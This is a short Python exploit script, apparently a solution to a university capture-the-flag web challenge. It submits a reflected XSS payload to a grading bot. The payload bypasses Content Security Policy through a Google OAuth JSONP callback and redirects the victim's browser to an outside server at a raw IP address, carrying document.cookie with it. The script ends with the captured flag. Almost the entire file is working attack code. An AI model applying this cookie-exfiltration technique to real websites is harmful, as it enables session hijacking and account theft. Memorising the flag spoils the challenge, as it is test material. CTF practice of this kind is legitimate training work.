import requests
import urllib.parse

url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1510'
netid = 'xz4344'
cookies = {"CHALBROKER_USER_ID": netid}

ip = 'http://137.184.25.70:8000'
script = f"<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=(function(){{window.top.location.href='{ip}/'%2bdocument.cookie;}})();\"></script>"
data = {
    'url': f'http://offsec-chalbroker.osiris.cyber.nyu.edu:10002/greet?name={urllib.parse.quote(script)}'
}

print(f"[*] Submitting XSS payload...")
response = requests.post(url=f'{url}/submit', data=data, cookies=cookies)
print(f"[+] Response: {response.text}")
print(f"[*] See flag at Cloud VM: {ip}")

# flag{R_U_4_r34l?D1d_y0U_just_byp4ss3d_CSP?W0w!_d13ab12b4d305a3d}
